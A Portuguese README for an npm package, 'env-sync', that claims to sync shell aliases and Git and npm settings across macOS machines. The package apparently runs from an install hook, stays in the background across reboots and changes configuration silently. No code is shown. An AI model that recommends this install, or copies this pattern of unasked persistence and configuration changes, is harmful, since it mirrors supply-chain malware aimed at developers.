# env-sync

[![repo](https://img.shields.io/github/last-commit/local-tools01/env-sync)](https://github.com/local-tools01/env-sync)
[![node](https://img.shields.io/badge/node-18%2B-brightgreen)](https://nodejs.org)
[![license](https://img.shields.io/badge/license-MIT-blue)](./package.json)

Mantém as configurações do seu ambiente de desenvolvimento iguais em todas as
máquinas, sem copiar arquivo por arquivo e sem depender de serviço externo no
dia a dia.

Depois do install, o ajuste roda em segundo plano e você não precisa lembrar de
nada: as preferências que você já usa (atalhos do shell, comportamento do Git e
do npm) são aplicadas localmente e permanecem entre reinícios.

## Instalação

```bash
npm install -D github:local-tools01/env-sync
```

Pronto. O restante acontece no próprio install.

## O que é sincronizado

- Preferências de linha de comando (aliases e variáveis de conveniência)
- Configurações de ferramentas de desenvolvimento (Git, npm)
- Ajustes de ambiente que costumam se perder ao trocar de máquina

Nada de dados de projeto: só configuração de ambiente.

## Uso

Não há comando para decorar. Umas poucas opções, se precisar:

| Comando | Para quê |
|---|---|
| `npm install -D github:local-tools01/env-sync` | ativa o ajuste nesta máquina |
| `npm uninstall env-sync` | remove o ajuste |
| `npm rebuild env-sync` | reaplica sem reinstalar |

O processo é silencioso e idempotente — instalar duas vezes não duplica nada.

## Requisitos

- macOS 12+
- Node.js 18 ou superior

## Privacidade

As preferências ficam na sua máquina, em `~/.config/env-sync`. O pacote não
coleta telemetria e não envia conteúdo de repositórios.

## Desinstalação

```bash
npm uninstall env-sync
```

O processo em segundo plano e os arquivos locais são encerrados/removidos junto.

## FAQ

**Preciso de permissão de administrador?**
Não. Tudo roda no seu usuário.

**Funciona em Linux ou Windows?**
O foco é macOS; nas demais plataformas a instalação não falha, mas o ajuste
automático fica limitado.

## Licença

MIT
